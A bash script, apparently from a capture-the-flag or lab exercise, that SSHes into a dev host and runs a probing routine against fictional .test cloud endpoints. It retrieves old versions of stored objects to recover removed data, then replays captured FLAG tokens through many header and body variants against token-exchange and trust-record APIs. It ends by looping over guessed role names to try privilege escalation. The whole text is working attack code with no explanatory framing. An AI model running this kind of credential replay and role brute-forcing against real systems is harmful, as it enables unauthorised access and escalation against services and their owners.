set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
E=https://objects.keplerops.test
echo "=== OLD VERSIONS ==="
echo "--- old handover"; curl -sSk -m 8 "$E/fieldkest-workspaces/exports/EXP-2841/handover.json?versionId=67169f3dc6c67c16c30d26c11660f4ab"; echo
echo "--- old notebook"; curl -sSk -m 8 "$E/fieldkest-workspaces/notebooks/deploy-2026-09.json?versionId=67169f3e5c4e624ee5fa60731e53ed20"; echo
C=https://cloud-api.keplerops.test
W="FLAG{adfbabdcdaca98ac}"
K="FLAG{6bb66074f2325405}"
p(){ echo "--- $1"; shift; curl -sSk -m 8 -w '\n[HTTP %{http_code}]\n' "$@" | head -c 900; echo; }
echo "=== TOKEN EXCHANGE GET ==="
p "W X-Workspace-Token GET exchange" -H "X-Workspace-Token: $W" "$C/api/workspaces/current/token-exchange"
p "W X-Workload-Token GET exchange" -H "X-Workload-Token: $W" "$C/api/workspaces/current/token-exchange"
p "W Bearer GET exchange" -H "Authorization: Bearer $W" "$C/api/workspaces/current/token-exchange"
p "K X-Workspace-Token GET exchange" -H "X-Workspace-Token: $K" "$C/api/workspaces/current/token-exchange"
p "K Bearer GET exchange" -H "Authorization: Bearer $K" "$C/api/workspaces/current/token-exchange"
echo "=== TOKEN EXCHANGE POST ==="
p "W X-Workspace-Token POST exchange" -X POST -H "X-Workspace-Token: $W" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
p "W Bearer POST exchange" -X POST -H "Authorization: Bearer $W" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
p "W body POST exchange" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$W\"}" "$C/api/workspaces/current/token-exchange"
p "K X-Workspace-Token POST exchange" -X POST -H "X-Workspace-Token: $K" -H 'Content-Type: application/json' -d '{}' "$C/api/workspaces/current/token-exchange"
echo "=== TRUST RECORD ==="
p "W X-Workspace-Token TR-1" -H "X-Workspace-Token: $W" "$C/api/trust-records/TR-1"
p "W X-Workload-Token TR-1" -H "X-Workload-Token: $W" "$C/api/trust-records/TR-1"
p "W Bearer TR-1" -H "Authorization: Bearer $W" "$C/api/trust-records/TR-1"
p "K X-Workspace-Token TR-1" -H "X-Workspace-Token: $K" "$C/api/trust-records/TR-1"
p "K Bearer TR-1" -H "Authorization: Bearer $K" "$C/api/trust-records/TR-1"
echo "=== ROLE EXCHANGE with W ==="
for r in rowan-workspace workspace fieldlink support support-export support-export-reader workload workoad fieldkest-workspace EXP-2841; do
 p "W bearer role=$r" -X POST -H "Authorization: Bearer $W" -H 'Content-Type: application/json' -d '{}' "$C/api/token-exchange/$r"
 p "W wsheader role=$r" -X POST -H "X-Workspace-Token: $W" -H 'Content-Type: application/json' -d '{}' "$C/api/token-exchange/$r"
done
RSH
echo DONE_K14_R12
